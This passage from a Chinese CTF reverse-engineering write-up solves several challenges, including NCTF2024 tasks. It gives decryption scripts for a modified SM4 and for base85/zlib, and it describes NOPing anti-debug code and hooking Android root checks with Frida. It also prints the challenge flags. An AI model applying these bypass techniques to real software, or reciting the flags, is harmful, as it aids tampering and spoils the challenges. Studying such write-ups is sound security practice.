alt="image-20250413174736801"></p><p>输出的内容就是每个字符和所对应的变量名(应该称之为变量名吗？)。然后继续分析</p><p>如果合在一起就是</p><blockquote><p>e}hCAvT|_I$PBkU&amp;8^*j??UjC-Eu03HQx{9h)fsr@b!Mbza<code>E@00</code>0SLOCDM@aZJ3}T^&lt;&amp;soW&gt;K);b46)R^5Q~60j9WLpOKaR?X&#x3D;B^blpE@}ScQbr&5eC;qC{uDh2&amp;&#96;o8byg;hY8jCT_f{2Y35input__import__base64b85encode__import__zlibcompressencodecencodeprintcorrect flag!</p></blockquote><p>然后根据那一堆没去混淆的z_zzz_zzz来进行回车分割可以猜测就是调用了<strong>encode()<strong>方法，然后还用到了</strong>zlib.compress()<strong>和</strong>base64.b85encode()</strong>，</p><p>再往下</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250413175212490.png" alt="image-20250413175212490"></p><p>就是对密文的加载，根据这里加载的混淆名，可以得到完整的密文，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250413175349102.png" alt="image-20250413175349102"></p><p>这里注意不能漏了最后一个’c’</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250413175419581.png" alt="image-20250413175419581"></p><p>然后梳理完整的流程就是</p><p>调用了encode()方法，将字符串转换为字节序列 -&gt;</p><p>使用zlib.compress()进行压缩-&gt;</p><p>使用base64.b85encode()对压缩后的数据进行base85编码-&gt;</p><p>然后就可以写脚本进行解密了</p><pre><code class="language-python">import base64import zlibencrypted_data = &quot;8*jM&amp;r0&#125;aB&#123;cb^&#125;hOlWbE&#123;pagYKuQ_oH6^DQxQ4`;02JaD5I&amp;@e6u?3o^ET_W@j5`CYBC|5;qT2bSRCjf&gt;@~9hb?U&#123;RhZL&amp;3!EvM?-Sh)8&lt;sPyk)Xb&#125;@sKrpb90=0TjCCCUe0&amp;8`3z;fAOL)^$c&quot;encrypted_data = encrypted_data[::-1]with open(&#39;decoded_data.bin&#39;, &#39;wb&#39;) as f:    decoded_data = base64.b85decode(encrypted_data)    f.write(decoded_data)    print(f&quot;decoded_data.bin (&#123;len(decoded_data)&#125;)&quot;)try:    decompressed_data = zlib.decompress(decoded_data)    print(f&quot;zlib success (&#123;len(decompressed_data)&#125; )&quot;)    with open(&#39;decompressed_data.bin&#39;, &#39;wb&#39;) as f:        f.write(decompressed_data)        print(&quot;result: decompressed_data.bin&quot;)except zlib.error as e:    print(f&quot;zlib failed: &#123;e&#125;&quot;)    # print(decoded_data.hex()[:100] + &#39;...&#39;)</code></pre><p>得到flag</p><p><strong>texsaw{python_4_will_never_exist_but_if_it_did_it_might_look_like_this_maybe_but_no_one_can_be_for_sure_did_yall_use_chatgpt_for_this?_let_me_know_if_so}</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2024</title>
      <link href="/2025/03/23/NCTF2024/"/>
      <url>/2025/03/23/NCTF2024/</url>
      
        <content type="html"><![CDATA[<h1 id="NCTF2024"><a href="#NCTF2024" class="headerlink" title="NCTF2024"></a>NCTF2024</h1><h3 id="ezDOS"><a href="#ezDOS" class="headerlink" title="ezDOS"></a>ezDOS</h3><p>MS-DOS on Intel 8086，先去一下花指令，ida打开分析过汇编，但是感觉提不出什么有用的信息，并且密文看着也很奇怪</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250323115241351.png" alt="image-20250323115241351"></p><p>那就只能用DOSBox来动态调试了，断点下在0020处，就是输出提示<strong>Show me your flag:</strong>，然后输入假flag，</p><p><strong>NCTF{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}</strong>，查看内存，使用指令<strong>d 0168</strong>，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/9162b12df1d510aa1d59371c0542492.png" alt="9162b12df1d510aa1d59371c0542492"></p><p>可以看到这里存储输入明文的地方</p><p>然后继续往下跟，发现一直到<strong>loc_10582</strong>，才对输入的flag进行了加密</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250323115614372.png" alt="image-20250323115614372"></p><p>异或处理</p><p>然后加密完之后查看内存</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250323115639694.png" alt="image-20250323115639694"></p><p>发现前几位和最后一位的数据是和这里是一样的</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250323115708399.png" alt="image-20250323115708399"></p><p>并且位数也对的上，38位</p><p>那么就可以根据假flag和其加密结果反推出异或的key，就可以和密文进行异或解密了</p><p>key</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250323115800377.png" alt="image-20250323115800377"></p><p>解密</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250323115811511.png" alt="image-20250323115811511"></p><p>拿到flag</p><p><strong>NCTF{Y0u_4r3_Assemb1y_M4st3r_5d0b497e}</strong></p><hr><h3 id="SafeProgram"><a href="#SafeProgram" class="headerlink" title="SafeProgram"></a>SafeProgram</h3><p>魔改SM4，改了两个常量。TLS1里有反调试，直接nop掉就可以了，然后动调取sbox和FK，动调的时候记得把Sleep也nop掉了，不然还得等，然后就可以直接写脚本解密了</p><pre><code class="language-c">#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;time.h&gt;/*--------------------------------------------------------------------------------------------------------------*/#define SM4_ENCRYPT 1#define SM4_DECRYPT 0/*--------------------------------------------------------------------------------------------------------------*//** * \brief          SM4 context structure */typedef struct&#123;    int mode;             /*!&lt;  encrypt/decrypt   */    unsigned long sk[32]; /*!&lt;  SM4 subkeys       */&#125; sm4_context;/*--------------------------------------------------------------------------------------------------------------*//** * \brief          SM4 key schedule (128-bit, encryption) * * \param ctx      SM4 context to be initialized * \param key      16-byte secret key */void sm4_setkey_enc(sm4_context *ctx, unsigned char key[16]);/*--------------------------------------------------------------------------------------------------------------*//** * \brief          SM4 key schedule (128-bit, decryption) * * \param ctx      SM4 context to be initialized * \param key      16-byte secret key */void sm4_setkey_dec(sm4_context *ctx, unsigned char key[16]);/*--------------------------------------------------------------------------------------------------------------*//** * \brief          SM4-ECB block encryption/decryption * \param ctx      SM4 context * \param mode     SM4_ENCRYPT or SM4_DECRYPT * \param length   length of the input data * \param input    input block * \param output   output block */void sm4_crypt_ecb(sm4_context *ctx,                   int mode,                   int length,                   unsigned char *input,                   unsigned char *output);/*--------------------------------------------------------------------------------------------------------------*//** * \brief          SM4-CBC buffer encryption/decryption * \param ctx      SM4 context * \param mode     SM4_ENCRYPT or SM4_DECRYPT * \param length   length of the input data * \param iv       initialization vector (updated after use) * \param input    buffer holding the input data * \param output   buffer holding the output data */void sm4_crypt_cbc(sm4_context *ctx,                   int mode,                   int length,                   unsigned char iv[16],                   unsigned char *input,                   unsigned char *output);/*--------------------------------------------------------------------------------------------------------------*//* * 32-bit integer manipulation macros (big endian) */#ifndef GET_ULONG_BE#define GET_ULONG_BE(n, b, i)                                                                                                                             \    &#123;                                                                                                                                                     \        (n) = ((unsigned long)(b)[(i)] &lt;&lt; 24) | ((unsigned long)(b)[(i) + 1] &lt;&lt; 16) | ((unsigned long)(b)[(i) + 2] &lt;&lt; 8) | ((unsigned long)(b)[(i) + 3]); \    &#125;#endif/*--------------------------------------------------------------------------------------------------------------*/#ifndef PUT_ULONG_BE#define PUT_ULONG_BE(n, b, i)                      \    &#123;                                              \        (b)[(i)] = (unsigned char)((n) &gt;&gt; 24);     \        (b)[(i) + 1] = (unsigned char)((n) &gt;&gt; 16); \        (b)[(i) + 2] = (unsigned char)((n) &gt;&gt; 8);  \        (b)[(i) + 3] = (unsigned char)((n));       \    &#125;#endif/*--------------------------------------------------------------------------------------------------------------*//* *rotate shift left marco definition * */#define SHL(x, n) (((x) &amp; 0xFFFFFFFF) &lt;&lt; n)#define ROTL(x, n) (SHL((x), n) | ((x) &gt;&gt; (32 - n)))#define SWAP(a, b)           \    &#123;                        \        unsigned long t = a; \        a = b;               \        b = t;               \        t = 0;               \    &#125;/*--------------------------------------------------------------------------------------------------------------*//** Expanded SM4 S-boxes/* Sbox table: 8bits input convert to 8 bits output*/       //已被魔改static const unsigned char SboxTable[16][16] =    &#123;        &#123;0xD1, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05&#125;,        &#123;0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99&#125;,        &#123;0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62&#125;,        &#123;0xE4, 0xB3, 0x17, 0xA9, 0x1C, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6&#125;,        &#123;0x47, 0x07, 0xA7, 0x4F, 0xF3, 0x73, 0x71, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0xD6, 0xA8&#125;,        &#123;0x68, 0x6B, 0x81, 0xB2, 0xFC, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35&#125;,        &#123;0x1E, 0x24, 0x0E, 0x78, 0x63, 0x58, 0x9F, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0xC9, 0x87&#125;,        &#123;0xD4, 0x00, 0x46, 0x57, 0x5E, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E&#125;,        &#123;0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1&#125;,        &#123;0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3&#125;,        &#123;0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F&#125;,        &#123;0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51&#125;,        &#123;0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8&#125;,        &#123;0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0&#125;,        &#123;0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84&#125;,        &#123;0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48&#125;&#125;;/*--------------------------------------------------------------------------------------------------------------*//* System parameter */static const unsigned long FK[4] =    &#123;0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc&#125;;       //已被魔改/*--------------------------------------------------------------------------------------------------------------*//* fixed parameter */static const unsigned long CK[32] =    &#123;        0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269,        0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,        0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249,        0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,        0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229,        0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,        0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,        0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279&#125;;/*--------------------------------------------------------------------------------------------------------------*//* * private function: * look up in SboxTable and get the related value. * args:    [in] inch: 0x00~0xFF (8 bits unsigned value). */static unsigned char sm4Sbox(unsigned char inch)&#123;    unsigned char *pTable = (unsigned char *)SboxTable;    unsigned char retVal = (unsigned char)(pTable[inch]);    return retVal;&#125;/*--------------------------------------------------------------------------------------------------------------*//* * private F(Lt) function: * &quot;T algorithm&quot; == &quot;L algorithm&quot; + &quot;t algorithm&quot;. * args:    [in] a: a is a 32 bits unsigned value; * return: c: c is calculated with line algorithm &quot;L&quot; and nonline algorithm &quot;t&quot; */static unsigned long sm4Lt(unsigned long ka)&#123;    unsigned long bb = 0;    unsigned long c = 0;    unsigned char a[4];    unsigned char b[4];    PUT_ULONG_BE(ka, a, 0)    b[0] = sm4Sbox(a[0]);    b[1] = sm4Sbox(a[1]);    b[2] = sm4Sbox(a[2]);    b[3] = sm4Sbox(a[3]);    GET_ULONG_BE(bb, b, 0)    c = bb ^ (ROTL(bb, 2)) ^ (ROTL(bb, 10)) ^ (ROTL(bb, 18)) ^ (ROTL(bb, 24));    return c;&#125;/*--------------------------------------------------------------------------------------------------------------*//* * private F function: * Calculating and getting encryption/decryption contents. * args:    [in] x0: original contents; * args:    [in] x1: original contents; * args:    [in] x2: original contents; * args:    [in] x3: original contents; * args:    [in] rk: encryption/decryption key; * return the contents of encryption/decryption contents. */static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2, unsigned long x3, unsigned long rk)&#123;    return (x0 ^ sm4Lt(x1 ^ x2 ^ x3 ^ rk));&#125;/*--------------------------------------------------------------------------------------------------------------*//* private function: * Calculating round encryption key. * args:    [in] a: a is a 32 bits unsigned value; * return: sk[i]: i&#123;0,1,2,3,...31&#125;. */static unsigned long sm4CalciRK(unsigned long ka)&#123;    unsigned long bb = 0;    unsigned long rk = 0;    unsigned char a[4];    unsigned char b[4];    PUT_ULONG_BE(ka, a, 0)    b[0] = sm4Sbox(a[0]);    b[1] = sm4Sbox(a[1]);    b[2] = sm4Sbox(a[2]);    b[3] = sm4Sbox(a[3]);    GET_ULONG_BE(bb, b, 0)    rk = bb ^ (ROTL(bb, 13)) ^ (ROTL(bb, 23));    return rk;&#125;/*--------------------------------------------------------------------------------------------------------------*/static void sm4_setkey(unsigned long SK[32], unsigned char key[16])&#123;    unsigned long MK[4];    unsigned long k[36];    unsigned long i = 0;    GET_ULONG_BE(MK[0], key, 0);    GET_ULONG_BE(MK[1], key, 4);    GET_ULONG_BE(MK[2], key, 8);    GET_ULONG_BE(MK[3], key, 12);    k[0] = MK[0] ^ FK[0];    k[1] = MK[1] ^ FK[1];    k[2] = MK[2] ^ FK[2];    k[3] = MK[3] ^ FK[3];    for (; i &lt; 32; i++)    &#123;        k[i + 4] = k[i] ^ (sm4CalciRK(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ CK[i]));        SK[i] = k[i + 4];    &#125;&#125;/*--------------------------------------------------------------------------------------------------------------*//* * SM4 standard one round processing * */static void sm4_one_round(unsigned long sk[32],                          unsigned char input[16],                          unsigned char output[16])&#123;    unsigned long i = 0;    unsigned long ulbuf[36];    memset(ulbuf, 0, sizeof(ulbuf));    GET_ULONG_BE(ulbuf[0], input, 0)    GET_ULONG_BE(ulbuf[1], input, 4)    GET_ULONG_BE(ulbuf[2], input, 8)    GET_ULONG_BE(ulbuf[3], input, 12)    while (i &lt; 32)    &#123;        ulbuf[i + 4] = sm4F(ulbuf[i], ulbuf[i + 1], ulbuf[i + 2], ulbuf[i + 3], sk[i]);        i++;    &#125;    PUT_ULONG_BE(ulbuf[35], output, 0);    PUT_ULONG_BE(ulbuf[34], output, 4);    PUT_ULONG_BE(ulbuf[33], output, 8);    PUT_ULONG_BE(ulbuf[32], output, 12);&#125;/*--------------------------------------------------------------------------------------------------------------*//* * SM4 key schedule (128-bit, encryption) */void sm4_setkey_enc(sm4_context *ctx, unsigned char key[16])&#123;    ctx-&gt;mode = SM4_ENCRYPT;    sm4_setkey(ctx-&gt;sk, key);&#125;/*--------------------------------------------------------------------------------------------------------------*//* * SM4 key schedule (128-bit, decryption) */void sm4_setkey_dec(sm4_context *ctx, unsigned char key[16])&#123;    int i;    ctx-&gt;mode = SM4_ENCRYPT;    sm4_setkey(ctx-&gt;sk, key);    for (i = 0; i &lt; 16; i++)    &#123;        SWAP(ctx-&gt;sk[i], ctx-&gt;sk[31 - i]);    &#125;&#125;/*--------------------------------------------------------------------------------------------------------------*//* * SM4-ECB block encryption/decryption */void sm4_crypt_ecb(sm4_context *ctx,                   int mode,                   int length,                   unsigned char *input,                   unsigned char *output)&#123;    while (length &gt; 0)    &#123;        sm4_one_round(ctx-&gt;sk, input, output);        input += 16;        output += 16;        length -= 16;    &#125;&#125;/*--------------------------------------------------------------------------------------------------------------*//* * SM4-CBC buffer encryption/decryption */void sm4_crypt_cbc(sm4_context *ctx,                   int mode,                   int length,                   unsigned char iv[16],                   unsigned char *input,                   unsigned char *output)&#123;    int i;    unsigned char temp[16];    if (mode == SM4_ENCRYPT)    &#123;        while (length &gt; 0)        &#123;            for (i = 0; i &lt; 16; i++)                output[i] = (unsigned char)(input[i] ^ iv[i]);            sm4_one_round(ctx-&gt;sk, output, output);            memcpy(iv, output, 16);            input += 16;            output += 16;            length -= 16;        &#125;    &#125;    else /* SM4_DECRYPT */    &#123;        while (length &gt; 0)        &#123;            memcpy(temp, input, 16);            sm4_one_round(ctx-&gt;sk, input, output);            for (i = 0; i &lt; 16; i++)                output[i] = (unsigned char)(output[i] ^ iv[i]);            memcpy(iv, temp, 16);            input += 16;            output += 16;            length -= 16;        &#125;    &#125;&#125;/*--------------------------------------------------------------------------------------------------------------*/int main()&#123;    unsigned char key[16] = &#123;0x4E, 0x43, 0x54, 0x46, 0x32, 0x34, 0x6E, 0x63, 0x74, 0x66,                             0x4E, 0x43, 0x54, 0x46, 0x32, 0x34&#125;;    unsigned char input[32] = &#123;        0xFB, 0x97, 0x3C, 0x3B, 0xF1, 0x99, 0x12, 0xDF,         0x13, 0x30, 0xF7, 0xD8, 0x7F, 0xEB, 0xA0, 0x6C,         0x14, 0x5B, 0xA6, 0x2A, 0xA8, 0x05, 0xA5, 0xF3,         0x76, 0xBE, 0xC9, 0x01, 0xF9, 0x36, 0x7B, 0x46    &#125;;    unsigned char output[16];    sm4_context ctx;    unsigned long i;    /*    //encrypt testing    sm4_setkey_enc(&amp;ctx,key);    sm4_crypt_ecb(&amp;ctx,1,16,input,output);    for(i=0;i&lt;16;i++)        printf(&quot;%02x &quot;, output[i]);    printf(&quot;\n&quot;);    */    // decrypt testing    sm4_setkey_dec(&amp;ctx, key);    sm4_crypt_ecb(&amp;ctx, 0, 32, input, output);    for (i = 0; i &lt; 32; i++)        printf(&quot;%c&quot;, output[i]);    printf(&quot;\n&quot;);    return 0;&#125;</code></pre><p><strong>NCTF{58cb925e0cd823c0d0b54fd06b820b7e}</strong></p><hr><h3 id="x1Login"><a href="#x1Login" class="headerlink" title="x1Login"></a>x1Login</h3><p>安卓逆向，有动调和root检测，frida写个脚本hook就能过掉。程序整体逻辑就是，native层的libsimple.so文件负责对调用的dex文件名进行加密，魔改的base64编码和异或，然后另外一个so文件就是负责密码的加密。</p><p>root检测等</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250323171522102.png" alt="image-20250323171522102"></p><p>调用check方法</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250323171607848.png" alt="image-20250323171607848"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250323171617139.png" alt="image-20250323171617139"></p><p>在assets文件夹里找到libsimple.so文件，把前面elf的文件头去掉，改下后缀成dex，就可以用jadx反编译了</p><pre><code class="language-Java">package com.nctf.simplelogin;import android.content.Context;import android.widget.Toast;import java.security.MessageDigest;/* loaded from: C:\Users\16219\Desktop\x1Login-release\assets\libsimple.dex */public class Check &#123;    Context context;    String password;    String username;    public Check(Context context, String username, String password) &#123;        this.username = username;        this.password = password;        this.context = context;    &#125;    public void check() &#123;        try &#123;            if (check_username()) &#123;                MessageDigest digest = MessageDigest.getInstance(DecStr.get(&quot;tMC2&quot;));                digest.update(this.username.getBytes());                byte[] output = digest.digest();                boolean result = check_password(output);                if (result) &#123;                    Toast.makeText(this.context, &quot;Login Successful! Now submit your flag!&quot;, 0).show();                    return;                &#125;            &#125;            Toast.makeText(this.context, &quot;Login Failed!&quot;, 0).show();        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    private boolean check_username() &#123;        return this.username.equals(DecStr.get(&quot;uZPOs29goMu6l38=&quot;));    &#125;    private boolean check_password(byte[] key) &#123;        return Secure.doCheck(this.password, key);    &#125;&#125;</code></pre><p>解密拿到用户名</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250323171713729.png" alt="image-20250323171713729"></p><p>这题的check机制有问题，输入正确的用户名，不输入密码，然后登录会显示成功。接着在libnative.so文件里分析密码是如果check的，首先是将用户名的md5传进去做key，再加密</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250323171903740.png" alt="image-20250323171903740"></p><p>但是分析无果，不知道是啥算法</p><p>在sub_1E30函数里看到有日志打印，但是拿不到输出的内容</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250323172006200.png" alt="image-20250323172006200"></p><p>赛后p34cd0wn师傅复现出来了，这确实是3DES加密，并且是标准的，我觉得应该是被优化的太厉害了，常量，密文，key的端序都发生了改变</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250324174512901.png" alt="image-20250324174512901"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250324174527515.png" alt="image-20250324174527515"></p><p>这是密文，密钥就是用户名md5</p><p>解密</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/c7936ade308afc82121463e5b215376.png" alt="c7936ade308afc82121463e5b215376"></p><p><strong>NCTF{X1c@dM1n1$t_SafePWD~5y$x?YM+5U05Gm6&#x3D;}</strong></p><hr><h3 id="gogo"><a href="#gogo" class="headerlink" title="gogo"></a>gogo</h3><p>第一次完整的复现一道vm，并且还学到了新方法，以前只会傻乎乎的找opcode，然后输出所有操作指令，再去进行分析，但这种硬撕，如果水平较低的话只能解决一些简单的vm，如果复杂的话那就很吃操作了。</p><p>go语言写的，但是整体代码逻辑还是较为清晰，但也还是要借助ai来辅助分析，不是很会go语言</p><pre><code class="language-go">// main.mainvoid __fastcall main_main()&#123;  int v0; // ecx  int v1; // edi  int v2; // esi  int v3; // r8d  int v4; // r9d  __int64 v5; // r14  int v6; // ecx  int v7; // r8d  int v8; // r9d  int v9; // ecx  int v10; // r8d  int v11; // r9d  int v12; // r8d  int v13; // r9d  int v14; // r10d  int v15; // r11d  int v16; // r10d  int v17; // r11d  main_coroutVM *p_main_coroutVM; // rax  char *v19; // rdx  void *v20; // rcx  void *v21; // rbx  _QWORD *v22; // r11  void *v23; // rsi  _QWORD *v24; // r11  main_coroutVM *v25; // rax  __int64 v26; // rcx  _QWORD *v27; // r11  void *v28; // r8  void *v29; // r9  void *v30; // r10  size_t v31; // rdx  main_coroutVM *v32; // rsi  uint8 *mem; // rdi  __int64 v34; // rbx  main_coroutVM *v35; // rbx  _QWORD *v36; // rax  int v37; // r8d  int v38; // r9d  int v39; // r10d  main_coroutVM **v40; // r11  main_coroutVM *v41; // rcx  _QWORD *v42; // rax  int v43; // r8d  int v44; // r9d  int v45; // r10d  main_coroutVM **v46; // r11  main_coroutVM *v47; // rcx  __int64 v48; // rcx  unsigned __int64 i; // rax  int v50; // r8d  int v51; // r9d  int v52; // r10d  int v53; // r11d  char v54; // cl  __int64 v55; // r8  __int64 v56; // [rsp-3Ah] [rbp-E0h]  __int64 v57; // [rsp-3Ah] [rbp-E0h]  __int64 v58; // [rsp-3Ah] [rbp-E0h]  __int64 v59; // [rsp-3Ah] [rbp-E0h]  __int64 v60; // [rsp-3Ah] [rbp-E0h]  __int64 v61; // [rsp-32h] [rbp-D8h]  __int64 v62; // [rsp-32h] [rbp-D8h]  __int64 v63; // [rsp-32h] [rbp-D8h]  __int64 v64; // [rsp-2Ah] [rbp-D0h]  __int64 v65; // [rsp-22h] [rbp-C8h]  __int64 v66; // [rsp-1Ah] [rbp-C0h]  char v67; // [rsp+0h] [rbp-A6h]  int v68; // [rsp+1h] [rbp-A5h] BYREF  char v69; // [rsp+5h] [rbp-A1h] BYREF  size_t len; // [rsp+6h] [rbp-A0h]  unsigned __int64 v71; // [rsp+Eh] [rbp-98h]  void *v72; // [rsp+16h] [rbp-90h]  main_coroutVM *v73; // [rsp+1Eh] [rbp-88h]  void *v74; // [rsp+26h] [rbp-80h]  main_coroutVM *v75; // [rsp+2Eh] [rbp-78h]  void *v76; // [rsp+36h] [rbp-70h]  main_coroutVM *v77; // [rsp+3Eh] [rbp-68h]  char *ptr; // [rsp+46h] [rbp-60h] BYREF  __int64 v79[2]; // [rsp+4Eh] [rbp-58h] BYREF  __int64 v80[2]; // [rsp+5Eh] [rbp-48h] BYREF  __int64 v81[2]; // [rsp+6Eh] [rbp-38h] BYREF  __int64 v82[2]; // [rsp+7Eh] [rbp-28h] BYREF  __int64 v83[2]; // [rsp+8Eh] [rbp-18h] BYREF  string *p_string; // [rsp+9Eh] [rbp-8h]  while ( &amp;ptr &lt;= *(v5 + 16) )    runtime_morestack_noctxt();  v74 = runtime_makechan(&amp;RTYPE_chan__4_uint8, 0, v0, v1, v2, v3, v4);// 初始化三个通道  v72 = runtime_makechan(&amp;RTYPE_chan__4_uint8, 0, v6, v1, v2, v7, v8);  v76 = runtime_makechan(&amp;RTYPE_chan_bool, 2, v9, v1, v2, v10, v11);  p_string = runtime_newobject(&amp;RTYPE_string);  v83[0] = &amp;RTYPE_string;  v83[1] = &amp;off_478B08;  fmt_Fprintln(off_479218, qword_510000, v83, 1, 1, v12, v13, v14, v15, v56, v61);// 交互提示输出  v82[0] = &amp;RTYPE__ptr_string;  v82[1] = p_string;  fmt_Fscanf(    off_479238,    qword_50FFF8,    &quot;%si), )(tvrRuUeEaAlLsS01bBoOxX+-nNiIfFpPLlLtLuMn: 25\&quot;\n [(\&quot;\&quot;)) )\n @s -&gt; Pn=][&#125;\n]\n&gt; \n \t  +osnil01_EOFintmapptr&quot;,    2,    v82,    1,    1,    v16,    v17,    v57,    v62,    v64,    HIDWORD(v64),    v65,    HIDWORD(v65),    v66,    HIDWORD(v66));  ptr = p_string-&gt;ptr;  len = p_string-&gt;len;  p_main_coroutVM = runtime_newobject(&amp;RTYPE_main_coroutVM);  v19 = &amp;unk_555420;  if ( ptr )    v19 = ptr;  if ( dword_555690 )  &#123;    p_main_coroutVM = runtime_gcWriteBarrier2(p_main_coroutVM);    v20 = v74;    *v22 = v74;    v21 = v76;    v22[1] = v76;  &#125;  else  &#123;    v20 = v74;    v21 = v76;  &#125;  v77 = v19;  p_main_coroutVM-&gt;instr = v20;  p_main_coroutVM-&gt;checkres = v21;  v23 = qword_50FFC0;  if ( dword_555690 )  &#123;    p_main_coroutVM = runtime_gcWriteBarrier1(p_main_coroutVM, v21, v20, 2LL, qword_50FFC0);    *v24 = v23;  &#125;  v75 = p_main_coroutVM;  p_main_coroutVM-&gt;instrSet = v23;  v25 = runtime_newobject(&amp;RTYPE_main_coroutVM);  if ( dword_555690 )  &#123;    v25 = runtime_gcWriteBarrier2(v25);    v28 = v72;    *v27 = v72;    v29 = v76;    v27[1] = v76;  &#125;  else  &#123;    v28 = v72;    v29 = v76;  &#125;  v25-&gt;instr = v28;  v25-&gt;checkres = v29;  v30 = qword_50FFC8;  if ( dword_555690 )  &#123;    v25 = runtime_gcWriteBarrier1(v25, v21, v26, 2LL, v23);    *v27 = v30;  &#125;  v25-&gt;instrSet = v30;  if ( p_string-&gt;len == 40 )                    // 长度检测，必须是40  &#123;    v31 = len;    if ( len &lt; 20 )                             // 字符串分割，分割前20字节      runtime_panicSliceAcap(v25, v21, 20LL);    v73 = v25;    v32 = v75;    mem = v75-&gt;mem;    v34 = v77;    if ( v77 != v75-&gt;mem )    &#123;      runtime_memmove(v75-&gt;mem, v77, 20LL);      v25 = v73;      v31 = len;      v34 = v77;      v32 = v75;    &#125;    if ( v31 &lt; 0x28 )                           // 字符串分割，分割后20字节      runtime_panicSliceAcap(v25, v34, 40LL);    v35 = (v34 + 20);    if ( v35 != v25-&gt;mem )      runtime_memmove(v25-&gt;mem, v35, 20LL);    v36 = runtime_newobject(&amp;unk_43CF60);       // 创建第一个协程    *v36 = main_main_gowrap1;                   // 第一个协程入口    if ( dword_555690 )    &#123;      v36 = runtime_gcWriteBarrier1(v36, v35, main_main_gowrap1, mem, v32);      v41 = v75;      *v40 = v75;    &#125;    else    &#123;      v41 = v75;    &#125;    v36[1] = v41;                               // 传参    runtime_newproc(v36, v35, v41, mem, v32, v37, v38, v39, v40, v58);// 启动协程    v42 = runtime_newobject(&amp;unk_43CF60);       // 创建第二个协程    *v42 = main_main_gowrap2;                   // 第二个协程入口    if ( dword_555690 )    &#123;      v42 = runtime_gcWriteBarrier1(v42, v35, main_main_gowrap2, mem, v32);      v47 = v73;      *v46 = 